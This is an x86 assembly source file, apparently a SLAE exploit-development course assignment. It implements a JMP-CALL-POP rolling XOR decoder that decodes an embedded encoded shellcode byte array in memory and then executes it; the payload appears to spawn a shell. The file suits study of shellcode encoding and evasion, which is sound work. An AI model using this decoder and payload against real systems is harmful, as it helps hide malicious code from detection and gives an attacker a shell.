;Author: John Stigerwalt
;SLAE: Assignment #4
;Website: slae.whiteknightlabs.com
;Shellcode: Rolling XOR decoder

global _start

section .text
_start:

    jmp short call_decoder

decoder:

    pop esi
    push esi
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    cdq             ; zero out edx for counter
    mov cl, len
    
    mov al, 0xe4
    
    
decode:
    
    mov bl, [esi]   ; grab first byte of shellcode
    xor al, bl      ; xor operation of 0xe4 and first byte of shellcode
    mov [esi], al   ; store xored byte into esi. Replaces encoded shellcode with decoded shellcode byte by byte
    mov al, bl      ; move encoded byte into al for rolling xor 
    inc esi         ; move to next byte stored is ESI. 
    dec cl          ; loop counter
    cmp cl, dl      ; comapre with length of "Shellcode" and "0"
    jnz decode
    
  
   jmp short Shellcode  ; execute decoded shellcode
   
call_decoder:

    call decoder
    Shellcode: db 0xd5,0x15,0x45,0x2d,0x2,0x2d,0x5e,0x36,0x5e,0x71,0x13,0x7a,0x14,0x9d,0x7e,0x2e,0xa7,0x45,0x16,0x9f,0x7e,0xce,0xc5,0x8,0x88
    
    len:    equ $-Shellcode
